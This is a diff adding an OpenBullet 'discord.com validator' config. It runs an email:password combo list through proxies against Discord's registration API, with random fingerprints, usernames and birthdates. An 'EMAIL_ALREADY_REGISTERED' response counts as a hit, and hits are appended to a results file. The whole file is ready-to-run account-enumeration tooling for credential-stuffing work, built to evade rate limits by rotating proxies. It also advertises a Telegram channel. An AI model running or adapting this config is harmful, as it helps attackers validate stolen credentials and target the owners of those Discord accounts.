@@ -1,0 +1,99 @@
+[SETTINGS]
+{
+  "Name": "discord.com validator",
+  "SuggestedBots": 40,
+  "MaxCPM": 0,
+  "LastModified": "2021-04-30T15:21:26.4843824+04:30",
+  "AdditionalInfo": "",
+  "Author": "@Hogo_Victor",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Author Telegram Id:@Hogo_Victor",
+      "VariableName": "",
+      "Id": 1231901019
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#random FUNCTION RandomString "?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d.?l?d?l?u?l?l?l?l?l?l?u?d?l?u?l?u?u?d?d?l?l?u?l?l?l?d?d" -> VAR "random" 
+
+#username FUNCTION RandomString "?u?l?l?l?l?l?l?l" -> VAR "username" 
+
+#1 FUNCTION RandomNum 1975 1999 -> VAR "1" 
+
+#2 FUNCTION RandomNum 1 9 -> VAR "2" 
+
+#3 FUNCTION RandomNum 10 30 -> VAR "3" 
+
+#d FUNCTION Constant "<1>-0<2>-<3>" -> VAR "d" 
+
+#Check REQUEST POST "https://discord.com/api/v9/auth/register" 
+  CONTENT "{\"fingerprint\":\"<random>\",\"email\":\"<USER>\",\"username\":\"<username>\",\"password\":\"<PASS>\",\"invite\":null,\"consent\":true,\"date_of_birth\":\"<d>\",\"gift_code_sku_id\":null,\"captcha_key\":null}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: discord.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: en-US" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Authorization: undefined" 
+  HEADER "X-Super-Properties: eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRmlyZWZveCIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJlbi1VUyIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2Ojg4LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvODguMCIsImJyb3dzZXJfdmVyc2lvbiI6Ijg4LjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMzNjQsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9" 
+  HEADER "X-Fingerprint: <random>" 
+  HEADER "Origin: https://discord.com" 
+  HEADER "Referer: https://discord.com/register" 
+  HEADER "Te: trailers" 
+  HEADER "Connection: close" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "EMAIL_ALREADY_REGISTERED" 
+  KEYCHAIN Failure OR 
+    KEY "captcha_service" 
+    KEY "Invalid Form Body" 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" Contains "429" 
+
+#Telegram_Channel FUNCTION Constant "https://t.me/OpenBulletChannel" -> CAP "Telegram Channel" 
+
+#Save UTILITY File "Discord Validator.txt" Append "<USER>:<PASS>\\n" -> VAR "Save" 
+
